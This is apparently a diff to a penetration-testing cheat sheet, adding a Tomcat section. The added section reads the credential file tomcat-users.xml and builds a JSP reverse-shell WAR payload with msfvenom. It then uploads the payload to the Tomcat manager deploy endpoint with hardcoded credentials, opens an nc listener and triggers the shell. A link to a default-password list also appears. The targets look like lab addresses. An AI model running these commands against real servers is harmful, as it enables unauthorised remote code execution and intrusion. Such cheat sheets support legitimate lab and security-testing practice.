@@ -640,7 +640,21 @@ Response.write("</pre><!-"&"-") %>
 ```
 
 ### Tomcat
-Tomcat Default PasswdList:  
+#### reverse shell
+```
+/usr/share/tomcat9/etc/tomcat-users.xml
+```
+```
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.6 LPORT=443 -f war -o payload.war
+
+curl --user 'tomcat':'$3cureP4s5w0rd123!' --upload-file payload.war "http://10.10.10.1/manager/text/deploy?path=/myapp"
+
+nc -lvnp 443
+
+curl --user 'tomcat':'$3cureP4s5w0rd123!' http://10.10.10.194:8080/myapp/
+```
+
+#### Tomcat Default PasswdList
 https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
 
 ```
